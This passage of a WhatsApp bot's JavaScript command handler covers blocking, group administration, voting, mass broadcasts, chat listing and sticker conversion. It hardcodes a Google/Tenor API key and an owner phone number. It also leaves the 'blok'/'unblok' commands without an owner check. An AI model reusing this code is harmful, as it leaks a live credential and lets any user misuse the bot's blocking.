	    		await hisoka.updateBlockStatus(text + '@s.whatsapp.net', 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	    		}
	    		break
        case prefix+'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
		    case prefix+'unblok': {
	    if (!text) throw `Nomor ?`
	    		await hisoka.updateBlockStatus(text + '@s.whatsapp.net', 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	    		}
	    		break
        case prefix+'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case prefix+'setname': case prefix+'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case prefix+'setdesc': case prefix+'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
case prefix+'apakah':
                apakah = body.slice(1)
                const apa =['Iya','Tidak','Gak lah','Dih songong','Najis','Bisa Jadi','Coba Ulangi']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                hisoka.sendMessage(m.chat, { text: '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah })
                break
case prefix+'kapan':
                kapan = body.slice(1)
                const ka =['Mungkin 5 Menit Lagi','Mungkin 10 Menit Lagi','Mungkin 1 Jam Lagi','Mungkin 2 Jam Lagi','Mungkin Tahun Depan','Mungkin 2 Tahu Lagi','Tidak Akan Pernah']
                const pan = ka[Math.floor(Math.random() * ka.length)]
                hisoka.sendMessage(m.chat, { text: '*Pertanyaan :* '+kapan+'\n*Jawaban :* '+ pan })
                break            
case prefix+'setpp': case prefix+'setppbot':
                if (!isCreator) throw mess.owner
                let mediaa = await hisoka.downloadAndSaveMediaMessage(quoted)
            var { img } = await pepe(mediaa)
            await hisoka.query({
            tag: 'iq',
            attrs: {
            to: botNumber,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            m.reply(`Sukses`)                
                break
                case prefix+'setppgroup': case prefix+'setppgrup': case prefix+'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let mediaa = await hisoka.downloadAndSaveMediaMessage(quoted)
            var { img } = await pepe(mediaa)
            await hisoka.query({
            tag: 'iq',
            attrs: {
            to: m.chat,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            m.reply(`Sukses`)       
            }         
                break
            case prefix+'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case prefix+'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            hisoka.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
               case prefix+'totag': {
               if (!m.isGroup) throw mess.group
               if (!isBotAdmins) throw mess.botAdmin
               if (!isAdmins) throw mess.admin
               if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
               hisoka.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
	    case prefix+'style': case prefix+'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case prefix+'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            hisoka.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case prefix+'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            hisoka.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case prefix+'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            hisoka.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case prefix+'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${hisoka.user.id}
`
hisoka.sendTextWithMentions(m.chat, teks_vote, m)
break
		case prefix+'deletevote': case'delvote': case prefix+'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case prefix+'group': case prefix+'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await hisoka.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await hisoka.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Group`, hisoka.user.name, m)

             }
            }
            break
            case prefix+'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await hisoka.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await hisoka.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Edit Info`, hisoka.user.name, m)

            }
            }
            break
            case prefix+'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Antilink`, hisoka.user.name, m)
                }
             }
             break
             case prefix+'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${hisoka.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${hisoka.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mute Bot`, hisoka.user.name, m)
                }
             }
             break
            case prefix+'linkgroup': case prefix+'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await hisoka.groupInviteCode(m.chat)
                hisoka.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case prefix+'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === '1') {
                    await hisoka.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await hisoka.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await hisoka.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await hisoka.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CHANGE EPHEMERAL GROUP",
                rows: [
                {title: "Ephemeral 1 day", rowId: `${prefix}ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
                {title: "Ephemeral 7 day's", rowId: `${prefix}ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
                {title: "Ephemeral 90 days's", rowId: `${prefix}ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
                {title: "Ephemeral Off", rowId: `${prefix}ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                hisoka.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, hisoka.user.name, `Hello Admin ${groupMetadata.subject}`, `Click Here`, sections, m)
                }
            }
            break
            case prefix+'setnamabot': case prefix+'setnamebot': {
            if (!isCreator) throw mess.owner
            if (!text) throw `Example : ${prefix + command} WhatsApp ✅`
            let name = await hisoka.updateProfileName(text)
            m.reply(`Successfully renamed bot to ${name}`)
            }
            break
            case prefix+'setstatus': case prefix+'setbiobot': case prefix+'setbotbio': {
            if (!isCreator) throw mess.owner
            if (!text) throw `this is a WhatsApp Bot named Hisoka-Morou`
            let name = await hisoka.updateProfileStatus(text)
            m.reply(`Successfully changed bot bio status to ${name}`)
            }
            break
            case prefix+'anticall': {
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0] === "on") {
                if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
                ciko = true
                m.reply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                m.reply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode AntiCall`, hisoka.user.name, m)
                }
             }
             break
            case prefix+'delete': case prefix+'del': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
 let key = {}                 
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 hisoka.sendMessage(m.chat, { delete: key })
            }
            break
            case prefix+'odel': case prefix+'adel': case prefix+'odelete': case prefix+'adelete': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
                  if (!isCreator) throw mess.owner
 let key = {}                 
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 hisoka.sendMessage(m.chat, { delete: key })
}
break
            case prefix+'bcgc': case prefix+'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await hisoka.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/Hisoka-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(i, txt, hisoka.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case prefix+'bc': case prefix+'broadcast': case prefix+'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
 hisoka.sendMessage(yoi, { text: text,
 contextInfo: {   
            externalAdReply :{
    mediaUrl: `${flaminge + 'broadcast'}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    title: `「 Broadcast Bot 」`,
    thumbnail: await getBuffer(flaminge + 'broadcast'),
    sourceUrl: ``
     }}
  }, { quoted: m })
		}
		m.reply('Sukses Broadcast')
            }
            break
            case prefix+'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                hisoka.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case prefix+'q': case prefix+'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await hisoka.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case prefix+'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case prefix+'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await hisoka.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case prefix+'listonline': case prefix+'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    hisoka.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case prefix+'sticker': case prefix+'s': case prefix+'stickergif': case prefix+'sgif': {
           let [text1, text2] = text.split`|`            
           if (/image/.test(mime)) {
                           hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: `${text1 ? '' + text1 : 'Create By Lui'}`, author: `${text2 ? '' + text2 : '' }` })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                            hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: `${text1 ? '' + text1 : 'Create By Lui'}`, author: `${text2 ? '' + text2 : '' }` })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
                }
            }
            break
            case prefix+'stickerwm': case prefix+'swm': case prefix+'stickergifwm': case prefix+'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                if (/image/.test(mime)) {
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case prefix+'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case prefix+'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case prefix+'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.result) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case prefix+'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case prefix+'attp': case prefix+'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
await hisoka.sendVideoAsSticker(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, m, { packname: global.packname, author: global.auhor })

         }
         break
	       case prefix+'smeme': case prefix+'stickmeme': case prefix+'stikmeme': case prefix+'stickermeme': case prefix+'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	                        hisoka.sendMessage(m.chat, waitv2, { quoted: m })

            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await hisoka.downloadMediaMessage(qmsg)
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case prefix+'simih': case prefix+'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case prefix+'toimage': case prefix+'toimg': {
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case prefix+'tomp4': case prefix+'tovideo': {
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

		        let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case prefix+'toaud': case prefix+'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
                            hisoka.sendMessage(m.chat, waitv2, { quoted: m })

            let media = await hisoka.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case prefix+'tomp3': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
                            hisoka.sendMessage(m.chat, waitv2, { quoted: m })

            let media = await hisoka.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${hisoka.user.name}.mp3`}, { quoted : m })
            }
            break
            case prefix+'tovn': case prefix+'toptt': {
